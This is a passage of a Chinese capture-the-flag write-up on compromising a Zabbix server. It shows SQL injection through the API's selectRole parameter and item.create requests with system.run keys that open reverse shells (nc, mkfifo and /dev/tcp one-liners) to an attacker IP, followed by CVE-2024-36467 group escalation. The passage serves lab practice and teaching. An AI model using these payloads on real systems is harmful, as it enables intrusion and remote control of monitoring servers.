class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注入ok，然后可以通过zabbix.session表拿到<code>admin</code>用户的凭证，来做进一步rce</p>
<p><img src="/wpimages/2024/Unrested/image-9.png" alt="alt text"></p>
<p>已经得知我们用户<code>id:3</code>，<code>id:1</code>自然就是admin了</p>
<p>这里寻找，通过<code>zabbix</code>可以执行命令达到rce的方式</p>
<blockquote>
<p>碎碎念：其实找资料这里也是卡的我很长时间，我找资料的思路感觉还需要练习，算是我的弱点了..明明osint我还蛮擅长的，感觉还是吃了英语的亏，啧</p>
</blockquote>
<p>针对zabbix的命令执行方式这里先查了下官方的文档得知</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.zabbix.com/documentation/2.2/jp/manual/config/items/itemtypes/zabbix_agent">https://www.zabbix.com/documentation/2.2/jp/manual/config/items/itemtypes/zabbix_agent</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system.run[command,&lt;mode&gt;]</span><br></pre></td></tr></table></figure>

<p><code>system.run</code>函数可以执行命令，接下来就带上<code>&quot;system.run&quot; zabbix rce &quot;bash&quot;</code>来寻找rce的相关资料，然后就出来蛮多的，去掉非接口的利用方式，因为我能拿到的凭证就这地方能用的样子</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/HD421/Monitoring-Systems-Cheat-Sheet/blob/master/Zabbix_spawn_shell_on_agents.md">https://github.com/HD421/Monitoring-Systems-Cheat-Sheet/blob/master/Zabbix_spawn_shell_on_agents.md</a></p>
</blockquote>
<p>这里作者用的<code>item.create</code>创建了一个<code>item</code>,<code>key_</code>部分可以执行命令，然后需要<code>hostid</code>和<code>interfaceid</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">zapi.login(user, password)</span><br><span class="line">host_name = hostname</span><br><span class="line">hosts = zapi.host.get(filter=&#123;&quot;host&quot;: host_name&#125;, selectInterfaces=[&quot;interfaceid&quot;])</span><br><span class="line">if hosts:</span><br><span class="line">    host_id = hosts[0][&quot;hostid&quot;]</span><br><span class="line">    print(&quot;Found host id &#123;0&#125;&quot;.format(host_id))</span><br><span class="line">    try:</span><br><span class="line">        item = zapi.item.create(</span><br><span class="line">            hostid=host_id,</span><br><span class="line">            name=&#x27;netcat_create_reverse_shell&#x27;,</span><br><span class="line">            key_=&#x27;system.run[&quot;nc 192.168.56.100 4444 -e /bin/bash&quot;]&#x27;,</span><br><span class="line">            type=0,</span><br><span class="line">            value_type=4,</span><br><span class="line">            interfaceid=hosts[0][&quot;interfaces&quot;][0][&quot;interfaceid&quot;],</span><br><span class="line">            delay=5</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

<p>作者是通过py<code>zabbix</code>库的<code>host.get</code>方法来获取的，这里翻一下官方文档用接口怎么查询hostid和interfaceid</p>
<p>官网文档直接搜<code>interfaceid</code>,api页面给到了一个example</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">data.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;host.get&quot;,</span><br><span class="line">    &quot;params&quot;: &#123;</span><br><span class="line">        &quot;output&quot;: [</span><br><span class="line">            &quot;hostid&quot;,</span><br><span class="line">            &quot;host&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;selectInterfaces&quot;: [</span><br><span class="line">            &quot;interfaceid&quot;,</span><br><span class="line">            &quot;ip&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;id&quot;: 2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">The response object will contain the requested data about the hosts:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;result&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;hostid&quot;: &quot;10084&quot;,</span><br><span class="line">            &quot;host&quot;: &quot;Zabbix server&quot;,</span><br><span class="line">            &quot;interfaces&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;interfaceid&quot;: &quot;1&quot;,</span><br><span class="line">                    &quot;ip&quot;: &quot;127.0.0.1&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;id&quot;: 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>api调用也是用<code>host.get</code>,所以试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \ </span><br><span class="line">--url &#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27; \</span><br><span class="line">--header &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">--data &#x27;&#123;</span><br><span class="line">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;host.get&quot;,</span><br><span class="line">    &quot;params&quot;: &#123;</span><br><span class="line">        &quot;output&quot;: [</span><br><span class="line">            &quot;hostid&quot;,</span><br><span class="line">            &quot;host&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;selectInterfaces&quot;: [</span><br><span class="line">            &quot;interfaceid&quot;,</span><br><span class="line">            &quot;ip&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,&quot;auth&quot;: &quot;e1ced7a080ba08ae4e48a63dbe1f4ff6e8a92336ebbb53d338bcdb577449f2c1&quot;, &quot;id&quot;: 1&#125;&#x27; -s|jq</span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;result&quot;: [],</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不知道为啥没有回显，所以注入看下库里的host信息（后来想了下这里是我忘记用admin的auth啦（笑））</p>
<p>找一下interfaceid在哪个表有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \</span><br><span class="line">--url &#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27; \</span><br><span class="line">--header &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">--data &#x27;&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot;: &#123;&quot;selectRole&quot;: [&quot;roleid,(select group_concat(table_name) from information_schema.columns where column_name=\&quot;interfaceid\&quot; and table_schema=\&quot;zabbix\&quot;)&quot;],&quot;editable&quot;:1&#125;, &quot;auth&quot;: &quot;e1ced7a080ba08ae4e48a63dbe1f4ff6e8a92336ebbb53d338bcdb577449f2c1&quot;, &quot;id&quot;: 1&#125;&#x27; -s|jq</span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;result&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;userid&quot;: &quot;3&quot;,</span><br><span class="line">      &quot;username&quot;: &quot;matthew&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Matthew&quot;,</span><br><span class="line">      &quot;surname&quot;: &quot;Smith&quot;,</span><br><span class="line">      &quot;url&quot;: &quot;&quot;,</span><br><span class="line">      &quot;autologin&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;autologout&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;lang&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;refresh&quot;: &quot;30s&quot;,</span><br><span class="line">      &quot;theme&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;attempt_failed&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;attempt_ip&quot;: &quot;&quot;,</span><br><span class="line">      &quot;attempt_clock&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;rows_per_page&quot;: &quot;50&quot;,</span><br><span class="line">      &quot;timezone&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;roleid&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;userdirectoryid&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;ts_provisioned&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;role&quot;: &#123;</span><br><span class="line">        &quot;roleid&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;(select group_concat(table_name) from information_schema.columns where column_name=\&quot;interfaceid\&quot; and table_schema=\&quot;zabbix\&quot;)&quot;: &quot;interface,interface_discovery,items,interface_snmp&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看字段名，这个<code>interface</code>表甚至还自带<code>hostid</code>,好贴心</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \</span><br><span class="line">--url &#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27; \</span><br><span class="line">--header &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">--data &#x27;&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot;: &#123;&quot;selectRole&quot;: [&quot;roleid,(select group_concat(column_name) from information_schema.columns where table_name=\&quot;interface\&quot; and table_schema=\&quot;zabbix\&quot;)&quot;],&quot;editable&quot;:1&#125;, &quot;auth&quot;: &quot;e1ced7a080ba08ae4e48a63dbe1f4ff6e8a92336ebbb53d338bcdb577449f2c1&quot;, &quot;id&quot;: 1&#125;&#x27; -s|jq</span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;result&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;userid&quot;: &quot;3&quot;,</span><br><span class="line">      &quot;username&quot;: &quot;matthew&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Matthew&quot;,</span><br><span class="line">      &quot;surname&quot;: &quot;Smith&quot;,</span><br><span class="line">      &quot;url&quot;: &quot;&quot;,</span><br><span class="line">      &quot;autologin&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;autologout&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;lang&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;refresh&quot;: &quot;30s&quot;,</span><br><span class="line">      &quot;theme&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;attempt_failed&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;attempt_ip&quot;: &quot;&quot;,</span><br><span class="line">      &quot;attempt_clock&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;rows_per_page&quot;: &quot;50&quot;,</span><br><span class="line">      &quot;timezone&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;roleid&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;userdirectoryid&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;ts_provisioned&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;role&quot;: &#123;</span><br><span class="line">        &quot;roleid&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;(select group_concat(column_name) from information_schema.columns where table_name=\&quot;interface\&quot; and table_schema=\&quot;zabbix\&quot;)&quot;: &quot;interfaceid,hostid,main,type,useip,ip,dns,port,available,error,errors_from,disable_until&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注入拿到interface表信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \</span><br><span class="line">--url &#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27; \</span><br><span class="line">--header &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">--data &#x27;&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot;: &#123;&quot;selectRole&quot;: [&quot;roleid,(select group_concat(concat_ws(\&quot;|\&quot;,interfaceid,hostid,main,type,useip,ip,dns,port,available,error,errors_from,disable_until)) from zabbix.interface)&quot;],&quot;editable&quot;:1&#125;, &quot;auth&quot;: &quot;e1ced7a080ba08ae4e48a63dbe1f4ff6e8a92336ebbb53d338bcdb577449f2c1&quot;, &quot;id&quot;: 1&#125;&#x27; -s|jq|grep &#x27;group_concat&#x27;|tr -s &#x27;,&#x27; &#x27;\n&#x27;</span><br><span class="line"></span><br><span class="line">1|10084|1|1|1|127.0.0.1||10050|1||0|0</span><br><span class="line">2|10333|1|1|1|&#123;#HV.IP&#125;||10050|0||0|0</span><br><span class="line">3|10334|1|1|1|&#123;#VM.IP&#125;||10050|0||0|0</span><br><span class="line">4|10367|1|1|1|&#123;#HV.IP&#125;||10050|0||0|0</span><br><span class="line">5|10368|1|1|1|&#123;#VM.IP&#125;||10050|0||0|0</span><br><span class="line">7|10511|1|1|1|&#123;#IP&#125;||10050|0||0|0</span><br><span class="line">8|10512|1|1|1|&#123;#IP&#125;||10050|0||0|0</span><br><span class="line">9|10513|1|1|1|&#123;#IP&#125;||10050|0||0|0</span><br><span class="line">10|10514|1|1|1|&#123;#IP&#125;||10050|0||0|0</span><br><span class="line">11|10523|1|1|1|&#123;#NODE_ADDRESS&#125;||10050|0||0|0</span><br><span class="line">12|10536|1|1|1|&#123;#AWS.EC2.INSTANCE.ID&#125;||10050|0||0|0</span><br><span class="line">13|10537|1|1|1|&#123;#AWS.RDS.INSTANCE.ID&#125;||10050|0||0|0</span><br><span class="line">14|10538|1|1|1|&#123;#AWS.S3.NAME&#125;||10050|0||0|0</span><br><span class="line">15|10567|1|1|1|&#123;#IP&#125;||10050|0||0|0</span><br><span class="line">19|10581|0|1|1|&#123;#GCE.INSTANCE.EXT.IP&#125;|external.ip|10050|0||0|0</span><br><span class="line">20|10581|1|1|1|&#123;#GCE.INSTANCE.IP&#125;|internal.ip|10050|0||0|0</span><br><span class="line">21|10578|0|1|1|&#123;#CLOUD_SQL.INSTANCE.EXT.IP&#125;|external.ip|10050|0||0|0</span><br><span class="line">22|10578|1|1|1|&#123;#CLOUD_SQL.INSTANCE.IP&#125;|internal.ip|10050|0||0|0</span><br><span class="line">23|10579|0|1|1|&#123;#CLOUD_SQL.INSTANCE.EXT.IP&#125;|external.ip|10050|0||0|0</span><br><span class="line">24|10579|1|1|1|&#123;#CLOUD_SQL.INSTANCE.IP&#125;|internal.ip|10050|0||0|0</span><br><span class="line">25|10580|0|1|1|&#123;#CLOUD_SQL.INSTANCE.EXT.IP&#125;|external.ip|10050|0||0|0</span><br><span class="line">26|10580|1|1|1|&#123;#CLOUD_SQL.INSTANCE.IP&#125;|internal.ip|10050|0||0|0</span><br><span class="line">27|10592|0|1|1|&#123;#INT.IP&#125;|internal.ip|10050|0||0|0</span><br><span class="line">28|10592|1|1|1|&#123;#IP&#125;|external.ip|10050|0||0|0</span><br><span class="line">29|10597|1|1|1|&#123;#CLIENT.IP&#125;||10050|0||0|0</span><br><span class="line">30|10598|1|1|1|&#123;#SERVER.IP&#125;||10050|0||0|0</span><br></pre></td></tr></table></figure>

<p>第一个应当就是他本地的节点,<code>interfaceid 1</code>和<code>hostid 10084</code>，居然和官方文档中的一样诶，难道是默认的吗，有趣。</p>
<p>尝试创建<code>item</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST --url <span class="string">&#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">--data <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span></span><br><span class="line"><span class="string">    &quot;method&quot;: &quot;item.create&quot;,</span></span><br><span class="line"><span class="string">    &quot;params&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;name&quot;: &quot;Free disk space on /home/joe/&quot;,</span></span><br><span class="line"><span class="string">        &quot;key_&quot;: &quot;system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.8 10086 &gt;/tmp/f]&quot;, </span></span><br><span class="line"><span class="string">        &quot;hostid&quot;: &quot;10084&quot;,</span></span><br><span class="line"><span class="string">        &quot;type&quot;: 0,</span></span><br><span class="line"><span class="string">        &quot;value_type&quot;: 3,</span></span><br><span class="line"><span class="string">        &quot;interfaceid&quot;: &quot;1&quot;,</span></span><br><span class="line"><span class="string">        &quot;tags&quot;: [</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;tag&quot;: &quot;component&quot;,</span></span><br><span class="line"><span class="string">                &quot;value&quot;: &quot;storage&quot;</span></span><br><span class="line"><span class="string">            &#125;,</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;tag&quot;: &quot;equipment&quot;,</span></span><br><span class="line"><span class="string">                &quot;value&quot;: &quot;workstation&quot;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        ],</span></span><br><span class="line"><span class="string">        &quot;delay&quot;: &quot;30s&quot;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;id&quot;: 1, &quot;auth&quot;: &quot;b893c0010d5d95f7453325d3d08a37e4&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> -s|jq</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;result&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;itemids&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;47183&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>nc接收到了revshell</p>
<p>但奇怪的是一秒就掉了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc -lnvp 10086</span><br><span class="line">listening on [any] 10086 ...</span><br><span class="line">connect to [10.10.16.8] from (UNKNOWN) [10.10.11.50] 51386</span><br><span class="line">bash: cannot set terminal process group (2220): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">zabbix@unrested:/$  </span><br></pre></td></tr></table></figure>

<p>看了下文本，应该是加个wait就可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">切り捨てられる末尾の空白を含めて、最大512KBのデータを返すことができます。</span><br><span class="line">mode - wait（デフォルト。実行終了を待機）、nowait（待機しない）のうち1つ 正しい処理のためには、コマンドの出力はテキストでなく</span><br></pre></td></tr></table></figure>

<p>我改成这个样子还是不行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system.run[\&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.8 10088 &gt;/tmp/f\&quot;,\&quot;wait\&quot;]&quot;</span><br></pre></td></tr></table></figure>

<p>然后没办法，只好在连上两秒内创建后台进程，成功revshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.8/10087 0&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<h2 id="Zabbix部分——预期解"><a href="#Zabbix部分——预期解" class="headerlink" title="Zabbix部分——预期解"></a>Zabbix部分——预期解</h2><p>这里可以通过<code>CVE-2024-36467</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://support.zabbix.com/browse/ZBX-25614">https://support.zabbix.com/browse/ZBX-25614</a></p>
</blockquote>
<p>将自己加到组里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more specifically a user with access to the user.update API endpoint is enough to be able to add themselves to any group</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L358">https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L358</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function update(array $users) &#123;</span><br><span class="line">	$this-&gt;validateUpdate($users, $db_users);</span><br><span class="line">	self::updateForce($users, $db_users);</span><br><span class="line"></span><br><span class="line">	return [&#x27;userids&#x27; =&gt; array_column($users, &#x27;userid&#x27;)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>updateForce</code>就是更新用户信息的<code>func</code></p>
<p><a target="_blank" rel="noopener" href="https://www.zabbix.com/documentation/7.2/en/manual/api/reference/user/update?hl=user.update">https://www.zabbix.com/documentation/7.2/en/manual/api/reference/user/update?hl=user.update</a></p>
<p>这里我们需要查一下自己的id先，通过刚才的<code>user.get</code>接口鉴权部分得知，我们可以通过<code>editable</code>设置为<code>1</code>来查询到自己的信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \ </span><br><span class="line">--url <span class="string">&#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">--data <span class="string">&#x27;&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot;: &#123;&quot;selectRole&quot;: [&quot;u.roleid&quot;],&quot;editable&quot;:1&#125;, &quot;auth&quot;: &quot;a22e1e871a2a048d8353dcc1471867a2&quot;, &quot;id&quot;: 1&#125;&#x27;</span> -s|jq</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;result&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;userid&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">      <span class="string">&quot;username&quot;</span>: <span class="string">&quot;matthew&quot;</span>,</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Matthew&quot;</span>,</span><br><span class="line">      <span class="string">&quot;surname&quot;</span>: <span class="string">&quot;Smith&quot;</span>,</span><br><span class="line">      <span class="string">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;autologin&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;autologout&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lang&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">      <span class="string">&quot;refresh&quot;</span>: <span class="string">&quot;30s&quot;</span>,</span><br><span class="line">      <span class="string">&quot;theme&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">      <span class="string">&quot;attempt_failed&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;attempt_ip&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;attempt_clock&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;rows_per_page&quot;</span>: <span class="string">&quot;50&quot;</span>,</span><br><span class="line">      <span class="string">&quot;timezone&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">      <span class="string">&quot;roleid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">      <span 